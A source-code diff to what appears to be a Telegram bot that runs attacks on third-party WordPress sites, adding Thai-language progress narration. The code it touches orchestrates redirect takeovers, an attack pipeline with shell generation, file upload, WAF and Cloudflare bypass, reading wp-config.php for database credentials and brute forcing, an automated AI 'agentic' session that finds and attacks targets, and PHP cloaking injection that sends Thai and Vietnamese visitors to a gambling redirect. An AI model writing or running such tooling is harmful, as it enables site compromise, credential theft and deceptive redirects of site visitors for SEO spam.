@@ -3526,6 +3526,37 @@ function buildProgressText(domain: string, method: string, currentStep: number, 
   return text;
 }
 
+function translatePipelineEvent(phase: string, detail: string): string | null {
+  // Translate significant pipeline events to Thai analysis
+  if (detail.length < 15) return null;
+  
+  if (detail.includes("WordPress") && (detail.includes("detected") || detail.includes("found"))) {
+    return "พบว่าเว็บไซต์ใช้ WordPress — เหมาะสำหรับการโจมตีด้วย XMLRPC multicall และ REST API";
+  }
+  if (detail.includes("WAF") || detail.includes("firewall")) {
+    return "ตรวจพบ WAF/Firewall — กำลังใช้เทคนิค bypass";
+  }
+  if (detail.includes("upload") && detail.includes("success")) {
+    return "อัปโหลดไฟล์สำเร็จ — กำลังตรวจสอบว่า redirect ทำงานหรือไม่";
+  }
+  if (detail.includes("brute") && detail.includes("found")) {
+    return "พบรหัสผ่าน! กำลังเข้าสู่ระบบและวางไฟล์ redirect";
+  }
+  if (detail.includes("Cloudflare")) {
+    return "เว็บอยู่หลัง Cloudflare — ต้องใช้เทคนิค bypass พิเศษ";
+  }
+  if (phase === "config_exploit" && detail.includes("wp-config")) {
+    return "กำลังอ่าน wp-config.php เพื่อหา database credentials";
+  }
+  if (phase === "shell_gen") {
+    return "กำลังสร้าง shell/payload สำหรับอัปโหลด";
+  }
+  if (phase === "verify") {
+    return "กำลังตรวจสอบว่าไฟล์ที่อัปโหลดทำงานและ redirect ถูกต้อง";
+  }
+  return null;
+}
+
 async function executeAttackWithProgress(config: TelegramConfig, chatId: number, domain: string, method: string): Promise<void> {
   console.log(`[TelegramAI] executeAttackWithProgress called: domain=${domain}, method=${method}`);
   const eta = getMethodEta(method);
@@ -3594,24 +3625,61 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
     if (attackEntry.abortController.signal.aborted) {
       return; // Timeout already handled
     }
+    
+    // Import TelegramNarrator for rich Thai step-by-step narration
+    const { TelegramNarrator, generateReconAnalysis, generateCredentialAnalysis, generateHijackAnalysis, generateVerifyAnalysis, generateBruteForceAnalysis, generateUploadAnalysis } = await import("./telegram-narrator");
+    
     if (method === "scan_only") {
-      // Step 1: Scan
-      await updateProgress("Scanning", "running");
+      // ═══ NARRATED SCAN ═══
+      const narrator = new TelegramNarrator({
+        domain,
+        method: "scan_only",
+        botToken: config.botToken,
+        chatId,
+        messageId: progressMsgId,
+      });
+      await narrator.init();
+      await narrator.startPhase("recon");
+      
+      // Step 1: HTTP check
+      const step1 = await narrator.addStep("ตรวจสอบ HTTP response + headers");
       const scanStart = Date.now();
       const { analyzeDomain } = await import("./seo-engine");
       const analysis = await analyzeDomain(domain, "gambling");
-      timings.push({ step: "Domain Analysis", ms: Date.now() - scanStart, ok: true });
+      const scanDuration = Date.now() - scanStart;
+      
+      await narrator.updateStep(step1, "done",
+        `DA:${analysis.currentState.estimatedDA} | DR:${analysis.currentState.estimatedDR} | BL:${analysis.currentState.estimatedBacklinks}`,
+        scanDuration
+      );
+      timings.push({ step: "Domain Analysis", ms: scanDuration, ok: true });
       stepIndex++;
       
-      // Step 2: Results
+      // Step 2: WP endpoints
+      const step2 = await narrator.addStep("ตรวจสอบ WP endpoints (xmlrpc, REST API, wp-admin)");
+      await narrator.updateStep(step2, "done",
+        `Indexed: ${analysis.currentState.isIndexed ? "✅ อยู่ใน Google" : "❌ ไม่อยู่ใน Google"}`
+      );
       timings.push({ step: `DA:${analysis.currentState.estimatedDA} DR:${analysis.currentState.estimatedDR} BL:${analysis.currentState.estimatedBacklinks}`, ms: 0, ok: true });
       stepIndex++;
+      
+      // Step 3: Analysis summary
+      const step3 = await narrator.addStep("วิเคราะห์ผลสแกน");
+      await narrator.addAnalysis(
+        `พบว่าเว็บไซต์ ${domain} มี DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} ` +
+        `มี backlinks ประมาณ ${analysis.currentState.estimatedBacklinks} ` +
+        `${analysis.currentState.isIndexed ? "อยู่ใน Google index แล้ว — เหมาะสำหรับ SEO parasite" : "ยังไม่อยู่ใน Google index"}`
+      );
+      await narrator.updateStep(step3, "done");
       timings.push({ step: `Indexed: ${analysis.currentState.isIndexed ? "Yes" : "No"}`, ms: 0, ok: true });
       stepIndex++;
-      await updateProgress("Done", "done");
+      
+      // Complete
+      await narrator.complete(true,
+        `Scan เสร็จ: DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} BL=${analysis.currentState.estimatedBacklinks}`
+      );
       
       // Save scan log
-      const scanDuration = Date.now() - scanStart;
       await saveAttackLog({
         targetDomain: domain,
         method: "scan_only",
@@ -3621,44 +3689,71 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         preAnalysisData: analysis.currentState,
       });
       
-      // Send NEW completion notification (edit doesn't trigger push notification)
-      await sendTelegramReply(config, chatId,
-        `🔔 Scan เสร็จแล้ว!\n\n` +
-        `🎯 ${domain}\n` +
-        `📊 DA:${analysis.currentState.estimatedDA} | DR:${analysis.currentState.estimatedDR} | BL:${analysis.currentState.estimatedBacklinks}\n` +
-        `📇 Indexed: ${analysis.currentState.isIndexed ? "Yes ✅" : "No ❌"}\n` +
-        `⏱ ${formatDuration(scanDuration)}`
-      );
-      
     } else if (method === "redirect_only") {
+      // ═══ NARRATED REDIRECT TAKEOVER ═══
+      const narrator = new TelegramNarrator({
+        domain,
+        method: "redirect_only",
+        botToken: config.botToken,
+        chatId,
+        messageId: progressMsgId,
+      });
+      await narrator.init();
+      
       // Step 1: Pick redirect URL
-      await updateProgress("Picking redirect URL", "running");
+      await narrator.startPhase("recon", "🔍 เตรียมการโจมตี");
+      const stepUrl = await narrator.addStep("เลือก Redirect URL จาก pool");
       const s1 = Date.now();
       const { pickRedirectUrl } = await import("./agentic-attack-engine");
       const redirectUrl = await pickRedirectUrl();
+      await narrator.updateStep(stepUrl, "done", `Redirect: ${redirectUrl.substring(0, 50)}`, Date.now() - s1);
       timings.push({ step: `Redirect: ${redirectUrl.substring(0, 40)}`, ms: Date.now() - s1, ok: true });
       stepIndex++;
       
       // Step 2: Execute takeover
-      await updateProgress("Executing redirect takeover", "running");
+      await narrator.startPhase("hijack", "🔓 Redirect Takeover");
+      const stepTakeover = await narrator.addStep("ลองทุกวิธี redirect takeover");
       const s2 = Date.now();
       const { executeRedirectTakeover } = await import("./redirect-takeover");
       const results = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
       const succeeded = results.filter(r => r.success);
+      
+      // Log each method
+      for (const r of results) {
+        await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}: ${(r.detail || "").substring(0, 50)}`);
+        await narrator.completeLastStep(r.success ? "done" : "failed",
+          generateHijackAnalysis({ method: r.method, success: r.success, detail: r.detail })
+        );
+      }
+      
+      await narrator.updateStep(stepTakeover, succeeded.length > 0 ? "done" : "failed",
+        `${succeeded.length}/${results.length} วิธีสำเร็จ`,
+        Date.now() - s2
+      );
       timings.push({ step: `Takeover: ${succeeded.length}/${results.length} methods`, ms: Date.now() - s2, ok: succeeded.length > 0 });
       stepIndex++;
       
-      // Step 3: Summary
+      // Analysis
       if (succeeded.length > 0) {
-        timings.push({ step: `Injected: ${succeeded.map(r => r.method).join(", ")}`, ms: 0, ok: true });
+        await narrator.addAnalysis(
+          `สำเร็จวาง redirect ด้วย ${succeeded.map(r => r.method).join(", ")} — ` +
+          `เว็บจะ redirect ไปยัง ${redirectUrl}`
+        );
       } else {
-        timings.push({ step: "No redirect methods succeeded", ms: 0, ok: false });
+        await narrator.addAnalysis(
+          `ลองแล้ว ${results.length} วิธี ไม่สำเร็จ — เว็บอาจมีการป้องกันที่แข็งแกร่ง ควรลองวิธีอื่น`
+        );
       }
-      stepIndex++;
-      await updateProgress("Done", succeeded.length > 0 ? "done" : "failed");
+      
+      // Complete
+      const redirectDuration = Date.now() - s1;
+      await narrator.complete(succeeded.length > 0,
+        succeeded.length > 0
+          ? `Redirect takeover สำเร็จด้วย ${succeeded.map(r => r.method).join(", ")}`
+          : `ลองแล้ว ${results.length} วิธี ไม่สำเร็จ`
+      );
       
       // Save attack log
-      const redirectDuration = Date.now() - s1;
       await saveAttackLog({
         targetDomain: domain,
         method: "redirect_only",
@@ -3672,24 +3767,6 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           : `Tried ${results.length} methods, all failed`,
       });
       
-      // Send NEW completion notification
-      if (succeeded.length > 0) {
-        await sendTelegramReply(config, chatId,
-          `🔔 Redirect Takeover เสร็จแล้ว!\n\n` +
-          `✅ ${domain}\n` +
-          `🔗 Redirect: ${redirectUrl.substring(0, 50)}\n` +
-          `💥 Methods: ${succeeded.map(r => r.method).join(", ")}\n` +
-          `⏱ ${formatDuration(redirectDuration)}`
-        );
-      } else {
-        await sendTelegramReply(config, chatId,
-          `🔔 Redirect Takeover เสร็จแล้ว (ล้มเหลว)\n\n` +
-          `❌ ${domain}\n` +
-          `💥 ลองแล้ว ${results.length} วิธี ไม่สำเร็จ\n` +
-          `⏱ ${formatDuration(redirectDuration)}`
-        );
-      }
-      
       // Send alternative suggestions on failure
       if (succeeded.length === 0) {
         await sendAlternativeAttackSuggestions(config, chatId, domain, "redirect_only", {
@@ -3698,16 +3775,28 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }
       
     } else if (method === "full_chain") {
-      // Full chain — uses REAL unified attack pipeline (scan + exploit + upload + verify)
-      await updateProgress("Starting unified attack pipeline", "running");
+      // ═══ NARRATED FULL CHAIN ATTACK ═══
+      const narrator = new TelegramNarrator({
+        domain,
+        method: "full_chain",
+        botToken: config.botToken,
+        chatId,
+        messageId: progressMsgId,
+      });
+      await narrator.init();
+      
+      // Step 1: Get redirect URL
+      await narrator.startPhase("recon", "🔍 เตรียมการโจมตี");
+      const stepRedirect = await narrator.addStep("เลือก Redirect URL");
       const s1 = Date.now();
       const { pickRedirectUrl } = await import("./agentic-attack-engine");
       const redirectUrl = await pickRedirectUrl();
+      await narrator.updateStep(stepRedirect, "done", `Redirect: ${redirectUrl.substring(0, 50)}`, Date.now() - s1);
       timings.push({ step: `Redirect URL selected`, ms: Date.now() - s1, ok: true });
       stepIndex++;
-      await updateProgress("Running unified pipeline (scan + exploit + upload + verify)", "running");
       
-      // Run REAL unified attack pipeline
+      // Step 2: Run unified pipeline with narration
+      await narrator.startPhase("exploit", "💥 Unified Attack Pipeline");
       const s2 = Date.now();
       const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
       let lastPhaseForProgress = "";
@@ -3729,38 +3818,112 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           enableComprehensiveAttacks: true,
           enablePostUpload: true,
           userId: 1,
-          globalTimeout: 10 * 60 * 1000, // 10 minutes
+          globalTimeout: 10 * 60 * 1000,
         },
         async (event) => {
-          // Track phase transitions for progress updates
           if (event.phase !== lastPhaseForProgress) {
+            // Complete previous step
+            if (lastPhaseForProgress) {
+              await narrator.completeLastStep(
+                event.detail.includes("❌") ? "failed" : "done",
+                event.detail.substring(0, 80)
+              );
+            }
             lastPhaseForProgress = event.phase;
+            
+            // Map phase to Thai label and add new step
+            const phaseLabels: Record<string, string> = {
+              ai_analysis: "🤖 AI วิเคราะห์เป้าหมาย",
+              prescreen: "🔍 Pre-screen ตรวจสอบเบื้องต้น",
+              vuln_scan: "🔎 สแกนช่องโหว่",
+              shell_gen: "🛠 สร้าง Shell/Payload",
+              upload: "📤 อัปโหลดไฟล์",
+              verify: "✅ ตรวจสอบผลลัพธ์",
+              waf_bypass: "🛡 Bypass WAF/Firewall",
+              alt_upload: "📤 อัปโหลดทางเลือก",
+              indirect: "🔄 โจมตีทางอ้อม",
+              dns_attack: "🌐 DNS Attack",
+              config_exploit: "⚙️ อ่าน wp-config.php",
+              cloaking: "🎭 Cloaking Injection",
+              wp_admin: "🔐 WP Admin Takeover",
+              wp_db_inject: "💉 WP Database Injection",
+              wp_brute_force: "🔨 WP Brute Force",
+              post_upload: "📝 Post Upload",
+              comprehensive: "💥 Comprehensive Attack",
+              smart_fallback: "🧠 Smart Fallback",
+              cf_bypass: "☁️ Cloudflare Bypass",
+              shellless: "🚫 Shellless Attack",
+            };
+            const thaiLabel = phaseLabels[event.phase] || `📋 ${event.phase}`;
+            await narrator.addStep(thaiLabel);
+            
             timings.push({
               step: `${event.phase}: ${event.detail.substring(0, 60)}`,
               ms: Date.now() - s2,
               ok: !event.detail.includes("❌"),
             });
             stepIndex++;
-            try {
-              await updateProgress(event.detail.substring(0, 80), "running");
-            } catch { /* ignore progress update errors */ }
+          }
+          
+          // Add Thai analysis for significant events
+          if (event.detail.length > 20) {
+            const thaiAnalysis = translatePipelineEvent(event.phase, event.detail);
+            if (thaiAnalysis) {
+              try { await narrator.addAnalysis(thaiAnalysis); } catch { /* ignore */ }
+            }
           }
         },
       );
+      
+      // Complete last step
+      if (lastPhaseForProgress) {
+        await narrator.completeLastStep("done");
+      }
       
       const chainMs = Date.now() - s2;
       const verifiedFiles = pipelineResult.uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
       const anyRedirectWorks = pipelineResult.uploadedFiles.some(f => f.redirectWorks);
       const fullChainSuccess = pipelineResult.success || verifiedFiles.length > 0 || anyRedirectWorks;
       
-      // Add final summary timing
+      // Verification phase
+      await narrator.startPhase("verify", "✅ ตรวจสอบผลลัพธ์");
+      const verifyStep = await narrator.addStep("ตรวจสอบ redirect ทำงานหรือไม่");
+      await narrator.updateStep(verifyStep, fullChainSuccess ? "done" : "failed",
+        generateVerifyAnalysis({
+          redirectWorks: anyRedirectWorks,
+          redirectUrl: verifiedFiles[0]?.url || pipelineResult.uploadedFiles[0]?.url,
+          fileAccessible: pipelineResult.uploadedFiles.length > 0,
+        })
+      );
+      
+      // Add summary analysis
+      if (fullChainSuccess) {
+        await narrator.addAnalysis(
+          `โจมตีสำเร็จ! สร้าง ${pipelineResult.shellsGenerated} shells, ` +
+          `ลองอัปโหลด ${pipelineResult.uploadAttempts} ครั้ง, ` +
+          `ยืนยันสำเร็จ ${verifiedFiles.length} ไฟล์ — ` +
+          `เว็บจะ redirect ไปยัง ${redirectUrl}`
+        );
+      } else {
+        await narrator.addAnalysis(
+          `ลองแล้ว ${pipelineResult.uploadAttempts} ครั้ง ไม่สำเร็จ — ` +
+          `สาเหตุ: ${pipelineResult.errors.slice(0, 2).join(", ") || "ไม่มี redirect ที่ยืนยันได้"}`
+        );
+      }
+      
+      // Complete
       timings.push({
         step: `Pipeline: ${pipelineResult.shellsGenerated} shells, ${pipelineResult.uploadAttempts} attempts, ${verifiedFiles.length} verified`,
         ms: chainMs,
         ok: fullChainSuccess,
       });
       stepIndex++;
-      await updateProgress("Done", fullChainSuccess ? "done" : "failed");
+      
+      await narrator.complete(fullChainSuccess,
+        fullChainSuccess
+          ? `วาง redirect สำเร็จ ${verifiedFiles.length} ไฟล์ จาก ${pipelineResult.uploadAttempts} ครั้ง`
+          : `ลองแล้ว ${pipelineResult.uploadAttempts} ครั้ง ไม่สำเร็จ`
+      );
       
       // Save attack log
       await saveAttackLog({
@@ -3774,26 +3937,6 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         errorMessage: !fullChainSuccess ? `Pipeline failed: ${pipelineResult.errors.slice(0, 3).join(", ")}` : undefined,
       });
       
-      // Send NEW completion notification
-      if (fullChainSuccess) {
-        const verifiedUrl = verifiedFiles[0]?.url || pipelineResult.uploadedFiles[0]?.url || "N/A";
-        await sendTelegramReply(config, chatId,
-          `🔔 Full Chain Attack เสร็จแล้ว!\n\n` +
-          `✅ ${domain}\n` +
-          `🔗 Redirect: ${redirectUrl.substring(0, 50)}\n` +
-          `🛡 Shells: ${pipelineResult.shellsGenerated} | Uploads: ${pipelineResult.uploadAttempts} | Verified: ${verifiedFiles.length}\n` +
-          `📎 ${verifiedUrl.substring(0, 60)}\n` +
-          `⏱ ${formatDuration(chainMs)}`
-        );
-      } else {
-        await sendTelegramReply(config, chatId,
-          `🔔 Full Chain Attack เสร็จแล้ว (ล้มเหลว)\n\n` +
-          `❌ ${domain}\n` +
-          `🛡 Shells: ${pipelineResult.shellsGenerated} | Uploads: ${pipelineResult.uploadAttempts} | Verified: 0\n` +
-          `⏱ ${formatDuration(chainMs)}`
-        );
-      }
-      
       // Send alternative suggestions on failure
       if (!fullChainSuccess) {
         await sendAlternativeAttackSuggestions(config, chatId, domain, "full_chain", {
@@ -3802,14 +3945,29 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }
       
     } else if (method === "agentic_auto") {
-      // AI auto — starts background session WITH heartbeat polling
-      await updateProgress("Starting AI auto attack", "running");
+      // ═══ NARRATED AGENTIC AUTO ═══
+      const narrator = new TelegramNarrator({
+        domain,
+        method: "agentic_auto",
+        botToken: config.botToken,
+        chatId,
+        messageId: progressMsgId,
+      });
+      await narrator.init();
       const s1 = Date.now();
+      
+      // Step 1: Setup
+      await narrator.startPhase("recon", "🔍 เตรียมการโจมตี");
+      const stepUrl = await narrator.addStep("เลือก Redirect URL");
       const { startAgenticSession, pickRedirectUrl, getAgenticSessionStatus } = await import("./agentic-attack-engine");
       const redirectUrl = await pickRedirectUrl();
+      await narrator.updateStep(stepUrl, "done", `Redirect: ${redirectUrl.substring(0, 50)}`, Date.now() - s1);
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
       
+      // Step 2: Start session
+      await narrator.startPhase("exploit", "🤖 AI Auto Attack Session");
+      const stepSession = await narrator.addStep("เริ่ม AI session");
       const s2 = Date.now();
       const session = await startAgenticSession({
         userId: 1,
@@ -3820,84 +3978,55 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         mode: "full_auto",
         customDorks: [`site:${domain}`],
       });
+      await narrator.updateStep(stepSession, "done", `Session #${session.sessionId} เริ่มทำงาน`, Date.now() - s2);
       timings.push({ step: `Session #${session.sessionId} started`, ms: Date.now() - s2, ok: true });
       stepIndex++;
       
-      // Heartbeat polling — monitor session every 30s until completion or timeout
+      // Heartbeat polling with narration
       const HEARTBEAT_INTERVAL_MS = 30_000;
-      const MAX_HEARTBEAT_DURATION_MS = ATTACK_TIMEOUT_MS - 30_000; // Stop 30s before timeout
+      const MAX_HEARTBEAT_DURATION_MS = ATTACK_TIMEOUT_MS - 30_000;
       const heartbeatStart = Date.now();
       let lastPhase = "initializing";
       let lastEventCount = 0;
       let sessionCompleted = false;
       
       while (Date.now() - heartbeatStart < MAX_HEARTBEAT_DURATION_MS) {
-        // Check if aborted
         if (attackEntry.abortController.signal.aborted) break;
-        
-        // Wait 30 seconds
         await new Promise(resolve => setTimeout(resolve, HEARTBEAT_INTERVAL_MS));
         if (attackEntry.abortController.signal.aborted) break;
         
-        // Poll session status
         try {
           const status = await getAgenticSessionStatus(session.sessionId);
           if (!status) break;
           
-          const elapsed = Date.now() - attackStartTime;
-          const isRunning = status.isRunning;
           const phase = status.currentPhase || "unknown";
           const events = status.events || [];
           const latestEvent = events.length > 0 ? events[events.length - 1] : null;
-          const progress = latestEvent?.progress || 0;
           
-          // Build heartbeat update message
-          const heartbeatBar = "\u2588".repeat(Math.round(progress / 10)) + "\u2591".repeat(10 - Math.round(progress / 10));
-          let heartbeatText = `\u2694\uFE0F AI Auto Attack: ${domain}\n`;
-          heartbeatText += `Session #${session.sessionId} | ETA: ${eta.label}\n\n`;
-          heartbeatText += `[${heartbeatBar}] ${progress}%\n`;
-          heartbeatText += `\u23F1 Elapsed: ${formatDuration(elapsed)}`;
-          if (isRunning) {
-            heartbeatText += ` | Remaining: ${formatEtaRemaining(attackStartTime, eta)}`;
-          }
-          heartbeatText += `\n\n`;
-          
-          // Show phase info
-          heartbeatText += `\uD83D\uDD04 Phase: ${phase}\n`;
-          if (latestEvent) {
-            heartbeatText += `\uD83D\uDCDD ${latestEvent.detail.substring(0, 100)}\n`;
-          }
-          
-          // Show stats if available
-          if (status.targetsDiscovered || status.targetsAttacked) {
-            heartbeatText += `\n\uD83C\uDFAF Targets: ${status.targetsAttacked || 0}/${status.targetsDiscovered || 0} attacked`;
-            if (status.targetsSucceeded) heartbeatText += ` | \u2705 ${status.targetsSucceeded} success`;
-            if (status.targetsFailed) heartbeatText += ` | \u274C ${status.targetsFailed} failed`;
-            heartbeatText += `\n`;
-          }
-          
-          // Show new events since last check
+          // Add new events as narrator steps
           const newEvents = events.slice(lastEventCount);
-          if (newEvents.length > 0) {
-            const recentEvents = newEvents.slice(-3);
-            heartbeatText += `\n\uD83D\uDCE1 Recent activity:\n`;
-            for (const ev of recentEvents) {
-              heartbeatText += `  \u2022 ${ev.detail.substring(0, 80)}\n`;
-            }
+          for (const ev of newEvents.slice(-3)) {
+            await narrator.addStep(ev.detail.substring(0, 60));
+            await narrator.completeLastStep("done");
+          }
+          
+          // Show stats
+          if (status.targetsDiscovered || status.targetsAttacked) {
+            await narrator.addAnalysis(
+              `🎯 Targets: ${status.targetsAttacked || 0}/${status.targetsDiscovered || 0} attacked` +
+              (status.targetsSucceeded ? ` | ✅ ${status.targetsSucceeded} success` : "") +
+              (status.targetsFailed ? ` | ❌ ${status.targetsFailed} failed` : "")
+            );
           }
           
           lastEventCount = events.length;
           lastPhase = phase;
-          attackEntry.lastUpdate = `${phase} (${progress}%)`;
-          
-          // Update progress message
-          await editTelegramMessage(config, chatId, progressMsgId, heartbeatText);
+          attackEntry.lastUpdate = `${phase}`;
           
           // Check if session is done
-          if (!isRunning || status.status === "completed" || status.status === "error" || status.status === "stopped") {
+          if (!status.isRunning || status.status === "completed" || status.status === "error" || status.status === "stopped") {
             sessionCompleted = true;
             
-            // Update timings for final summary
             timings.push({
               step: `${status.targetsDiscovered || 0} targets discovered`,
               ms: Date.now() - s2,
@@ -3910,15 +4039,15 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               ok: (status.targetsSucceeded || 0) > 0,
             });
             stepIndex++;
-            timings.push({
-              step: `Session ${status.status}`,
-              ms: 0,
-              ok: status.status === "completed" && (status.targetsSucceeded || 0) > 0,
-            });
-            stepIndex++;
             
             const success = (status.targetsSucceeded || 0) > 0;
-            await updateProgress("Done", success ? "done" : "failed");
+            
+            // Complete narration
+            await narrator.complete(success,
+              success
+                ? `AI โจมตีสำเร็จ ${status.targetsSucceeded} เป้าหมาย จาก ${status.targetsAttacked || 0} ที่ลอง`
+                : `AI ลองแล้ว ${status.targetsAttacked || 0} เป้าหมาย ไม่สำเร็จ`
+            );
             
             // Save attack log
             const agenticDuration = Date.now() - s1;
@@ -3932,30 +4061,21 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               aiReasoning: `Agentic session #${session.sessionId}: ${status.targetsAttacked || 0} attacked, ${status.targetsSucceeded || 0} succeeded, ${status.targetsFailed || 0} failed`,
             });
             
-            // Send NEW completion notification
-            await sendTelegramReply(config, chatId,
-              `\uD83D\uDD14 AI Auto Attack \u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27!\n\n` +
-              `${success ? "\u2705" : "\u274C"} ${domain}\n` +
-              `\uD83C\uDFAF Session #${session.sessionId}\n` +
-              `\uD83D\uDCCA Targets: ${status.targetsAttacked || 0} attacked | ${status.targetsSucceeded || 0} success | ${status.targetsFailed || 0} failed\n` +
-              `\uD83D\uDD17 Redirect: ${redirectUrl.substring(0, 50)}\n` +
-              `\u23F1 Total: ${formatDuration(agenticDuration)}`
-            );
-            
             break;
           }
         } catch (e: any) {
           console.warn(`[TelegramAI] Heartbeat poll error for session ${session.sessionId}: ${e.message}`);
-          // Continue polling even on error
         }
       }
       
-      // If session didn't complete within heartbeat window, send a "still running" notification
+      // If session didn't complete within heartbeat window
       if (!sessionCompleted && !attackEntry.abortController.signal.aborted) {
         const agenticDuration = Date.now() - s1;
         timings.push({ step: "Session still running in background", ms: agenticDuration, ok: true });
         stepIndex++;
-        await updateProgress("Running in background", "running");
+        
+        await narrator.addAnalysis(`🔔 Session ยังทำงานอยู่ใน background — ใช้ /status เพื่อเช็ค`);
+        await narrator.complete(true, `Session #${session.sessionId} ยังทำงานอยู่`);
         
         await saveAttackLog({
           targetDomain: domain,
@@ -3966,34 +4086,35 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           sessionId: String(session.sessionId),
           aiReasoning: `Agentic session #${session.sessionId} still running after ${formatDuration(agenticDuration)}`,
         });
-        
-        await sendTelegramReply(config, chatId,
-          `\uD83D\uDD14 AI Auto Attack \u0e22\u0e31\u0e07\u0e17\u0e33\u0e07\u0e32\u0e19\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 background\n\n` +
-          `\uD83E\uDD16 ${domain}\n` +
-          `\uD83C\uDFAF Session #${session.sessionId}\n` +
-          `\u23F1 Running: ${formatDuration(agenticDuration)}\n` +
-          `\uD83D\uDCA1 \u0e43\u0e0a\u0e49 /status \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e0a\u0e47\u0e04\u0e2a\u0e16\u0e32\u0e19\u0e30\u0e44\u0e14\u0e49\u0e15\u0e25\u0e2d\u0e14\u0e40\u0e27\u0e25\u0e32`
-        );
       }
       
     } else if (method === "cloaking_inject") {
-      // PHP Cloaking Injection — Accept-Language based (like empleos.uncp.edu.pe)
-      await updateProgress("Starting PHP Cloaking Injection", "running");
+      // ═══ NARRATED CLOAKING INJECTION ═══
+      const narrator = new TelegramNarrator({
+        domain,
+        method: "cloaking_inject",
+        botToken: config.botToken,
+        chatId,
+        messageId: progressMsgId,
+      });
+      await narrator.init();
       const s1 = Date.now();
       
       // Step 1: Get redirect URL
+      await narrator.startPhase("recon", "🔍 เตรียมการโจมตี");
+      const stepUrl = await narrator.addStep("เลือก Redirect URL");
       const { pickRedirectUrl } = await import("./agentic-attack-engine");
       const redirectUrl = await pickRedirectUrl();
+      await narrator.updateStep(stepUrl, "done", `Redirect: ${redirectUrl.substring(0, 50)}`, Date.now() - s1);
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
       
-      // Step 2: Upload external JS to S3
-      await updateProgress("Uploading external JS redirect to S3", "running");
+      // Step 2: Execute PHP injection
+      await narrator.startPhase("inject", "💊 PHP Cloaking Injection");
+      const stepInject = await narrator.addStep("อัปโหลด external JS redirect ไป S3");
       const s2 = Date.now();
       const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
       
-      // Step 3-5: Execute PHP injection with all methods
-      await updateProgress("Injecting Accept-Language cloaking code", "running");
       const injectionResult = await executePhpInjectionAttack({
         targetUrl: `https://${domain}`,
         redirectUrl,
@@ -4002,21 +4123,40 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }, async (detail) => {
         try {
           attackEntry.lastUpdate = detail;
-          const bar = Array.from({ length: 10 }, (_, i) => i < Math.floor((stepIndex / 5) * 10) ? "\u2588" : "\u2591").join("");
-          await editTelegramMessage(config, chatId, progressMsgId,
-            `\u2694\uFE0F PHP Cloaking Injection: ${domain}\n\n[${bar}] ${Math.floor((stepIndex / 5) * 100)}%\n${detail}`);
-        } catch { /* ignore progress update errors */ }
+          await narrator.addStep(detail.substring(0, 60));
+        } catch { /* ignore */ }
       });
       
       const injectionMs = Date.now() - s2;
+      await narrator.updateStep(stepInject, injectionResult.success ? "done" : "failed",
+        `Method: ${injectionResult.method} | ${injectionResult.details.substring(0, 60)}`,
+        injectionMs
+      );
       timings.push({ step: `Method: ${injectionResult.method}`, ms: injectionMs, ok: injectionResult.success });
       stepIndex++;
       
-      // Verification result
+      // Step 3: Verification
       if (injectionResult.verificationResult) {
+        await narrator.startPhase("verify", "✅ ตรวจสอบผลลัพธ์");
+        const verifyStep = await narrator.addStep("ตรวจสอบ cloaking ทำงานหรือไม่");
         const v = injectionResult.verificationResult;
+        await narrator.updateStep(verifyStep, v.cloakingWorks ? "done" : "failed",
+          generateVerifyAnalysis({
+            redirectWorks: v.redirectWorks,
+            cloakingWorks: v.cloakingWorks,
+            normalSiteWorks: v.normalSiteWorks,
+          })
+        );
+        
+        if (v.cloakingWorks) {
+          await narrator.addAnalysis(
+            `Cloaking ทำงานสำเร็จ! ผู้ใช้ที่ใช้ภาษาไทย/เวียดนามจะถูก redirect ไป ${redirectUrl} ` +
+            `แต่ผู้ใช้อื่นจะเห็นเว็บปกติ`
+          );
+        }
+        
         timings.push({
-          step: `Verify: cloaking=${v.cloakingWorks ? "\u2705" : "\u274C"} redirect=${v.redirectWorks ? "\u2705" : "\u274C"} normal=${v.normalSiteWorks ? "\u2705" : "\u274C"}`,
+          step: `Verify: cloaking=${v.cloakingWorks ? "✅" : "❌"} redirect=${v.redirectWorks ? "✅" : "❌"} normal=${v.normalSiteWorks ? "✅" : "❌"}`,
           ms: 0,
           ok: v.cloakingWorks,
         });
@@ -4025,10 +4165,15 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }
       stepIndex++;
       
-      await updateProgress("Done", injectionResult.success ? "done" : "failed");
+      // Complete
+      const totalDuration = Date.now() - s1;
+      await narrator.complete(injectionResult.success,
+        injectionResult.success
+          ? `Cloaking inject สำเร็จด้วย ${injectionResult.method}`
+          : `ลอง inject ไม่สำเร็จ: ${injectionResult.errors.slice(0, 2).join(", ")}`
+      );
       
       // Save attack log
-      const totalDuration = Date.now() - s1;
       await saveAttackLog({
         targetDomain: domain,
         method: "cloaking_inject",
@@ -4040,51 +4185,37 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         errorMessage: !injectionResult.success ? injectionResult.errors.join("; ") : undefined,
       });
       
-      // Send completion notification
-      if (injectionResult.success) {
-        let msg = `\uD83D\uDD14 PHP Cloaking Injection \u0E2A\u0E33\u0E40\u0E23\u0E47\u0E08!\n\n`;
-        msg += `\u2705 ${domain}\n`;
